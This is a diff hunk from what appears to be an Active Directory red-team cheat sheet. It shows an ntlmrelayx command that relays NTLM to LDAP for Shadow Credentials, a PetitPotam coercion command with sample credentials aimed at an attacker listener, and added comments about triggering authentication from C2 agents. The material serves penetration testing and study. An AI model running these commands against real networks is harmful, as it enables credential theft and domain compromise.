@@ -270,7 +270,11 @@ COFFLoader64.exe go StartWebClientSvc.x64.o
 
 # NTLM relay to LDAP for Shadow Credentials
 sudo python3 ntlmrelayx.py -smb2support -t ldap://dc2.kawakatz.local --shadow-credentials --shadow-target 'WKS$' --no-dump --no-da --no-acl --no-validate-privs
-python3 PetitPotam.py -u coward -p 'P@ssw0rd' -d kawakatz.local <attacker ip>@80/share wks.kawakatz.local
+python3 PetitPotam.py -u coward -p 'P@ssw0rd' -d kawakatz.local attacker@80/share wks.kawakatz.local
+
+# If only anonymous authentication occurs,
+# verify that the target is treated as an Intranet Zone.
+# ls commands from C2 agents can trigger authentication as an alternative to PetitPotam
 
 # Abuse the certificate as above...
 ```
